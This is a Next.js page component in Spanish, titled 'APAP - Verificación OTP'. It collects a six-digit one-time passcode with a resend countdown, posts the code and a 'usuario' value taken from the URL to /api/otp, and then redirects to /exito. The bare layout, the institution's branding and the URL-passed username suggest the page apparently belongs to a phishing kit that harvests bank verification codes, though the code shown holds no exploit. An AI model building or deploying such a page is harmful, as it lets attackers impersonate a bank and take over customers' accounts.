import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';

export default function OtpPage() {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const router = useRouter();
  const { usuario } = router.query;

  useEffect(() => {
    // Iniciar cuenta regresiva para reenvío
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          setCanResend(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value && !/^\d+$/.test(value)) return;
    
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Mover al siguiente campo automáticamente
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`) as HTMLInputElement;
      if (nextInput) nextInput.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`) as HTMLInputElement;
      if (prevInput) prevInput.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpCode = otp.join('');
    
    if (otpCode.length !== 6) {
      setMessage('Por favor ingresa un código de 6 dígitos');
      return;
    }

    setLoading(true);
    
    try {
      const response = await fetch('/api/otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          usuario,
          otp: otpCode 
        }),
      });
      
      const data = await response.json();
      
      if (response.ok) {
        // Redirigir a la página de éxito
        router.push('/exito');
      } else {
        setMessage(data.error || 'Código incorrecto');
      }
    } catch (error) {
      setMessage('Error al conectar con el servidor');
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleResend = async () => {
    if (!canResend) return;
    
    setLoading(true);
    setMessage('');
    
    try {
      const response = await fetch('/api/resend', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          usuario,
          note: 'Reenvío solicitado por el usuario' 
        }),
      });
      
      const data = await response.json();
      
      if (response.ok) {
        setMessage('Código reenviado correctamente');
        setCanResend(false);
        setCountdown(60);
        
        // Reiniciar cuenta regresiva
        const timer = setInterval(() => {
          setCountdown((prev) => {
            if (prev <= 1) {
              setCanResend(true);
              clearInterval(timer);
              return 0;
            }
            return prev - 1;
          });
        }, 1000);
      } else {
        setMessage(data.error || 'Error al reenviar el código');
      }
    } catch (error) {
      setMessage('Error al conectar con el servidor');
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container">
      <Head>
        <title>APAP - Verificación OTP</title>
      </Head>

      <main>
        <h1>Verificación de Código</h1>
        <p>Hemos enviado un código de verificación a tu {router.query.canal === 'whatsapp' ? 'WhatsApp' : 'SMS'}</p>
        
        {message && <div className={`message ${message.includes('correcto') ? 'success' : ''}`}>{message}</div>}
        
        <form onSubmit={handleSubmit} className="otp-form">
          <div className="otp-inputs">
            {otp.map((digit, index) => (
              <input
                key={index}
                id={`otp-${index}`}
                type="text"
                maxLength={1}
                value={digit}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="otp-input"
                disabled={loading}
                autoFocus={index === 0}
              />
            ))}
          </div>
          
          <button type="submit" disabled={loading} className="verify-button">
            {loading ? 'Verificando...' : 'Verificar Código'}
          </button>
        </form>

        <div className="resend-container">
          <p>
            ¿No recibiste el código?{' '}
            <button 
              type="button" 
              onClick={handleResend} 
              disabled={!canResend || loading}
              className="resend-button"
            >
              Reenviar {!canResend && `(${countdown}s)`}
            </button>
          </p>
        </div>
      </main>

      <style jsx>{`
        .container {
          min-height: 100vh;
          padding: 0 0.5rem;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          background-color: #f5f5f5;
        }
        
        main {
          background: white;
          padding: 2rem;
          border-radius: 8px;
          box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
          max-width: 400px;
          width: 100%;
          text-align: center;
        }
        
        h1 {
          margin-bottom: 1rem;
          color: #333;
        }
        
        p {
          color: #666;
          margin-bottom: 2rem;
        }
        
        .otp-form {
          margin-bottom: 2rem;
        }
        
        .otp-inputs {
          display: flex;
          justify-content: space-between;
          margin-bottom: 1.5rem;
        }
        
        .otp-input {
          width: 40px;
          height: 50px;
          text-align: center;
          font-size: 1.5rem;
          border: 1px solid #ddd;
          border-radius: 4px;
          margin: 0 5px;
        }
        
        .otp-input:focus {
          outline: 2px solid #0070f3;
          border-color: #0070f3;
        }
        
        .verify-button {
          background-color: #0070f3;
          color: white;
          border: none;
          padding: 0.75rem 1.5rem;
          font-size: 1rem;
          border-radius: 4px;
          cursor: pointer;
          width: 100%;
          transition: background-color 0.2s;
        }
        
        .verify-button:hover:not(:disabled) {
          background-color: #005bb5;
        }
        
        .verify-button:disabled {
          background-color: #ccc;
          cursor: not-allowed;
        }
        
        .resend-container {
          margin-top: 1rem;
          color: #666;
        }
        
        .resend-button {
          background: none;
          border: none;
          color: #0070f3;
          cursor: pointer;
          padding: 0;
          font: inherit;
          text-decoration: underline;
        }
        
        .resend-button:disabled {
          color: #999;
          cursor: not-allowed;
          text-decoration: none;
        }
        
        .message {
          padding: 1rem;
          margin-bottom: 1.5rem;
          border-radius: 4px;
          background-color: #fff3cd;
          color: #856404;
        }
        
        .message.success {
          background-color: #d4edda;
          color: #155724;
        }
      `}</style>
    </div>
  );
}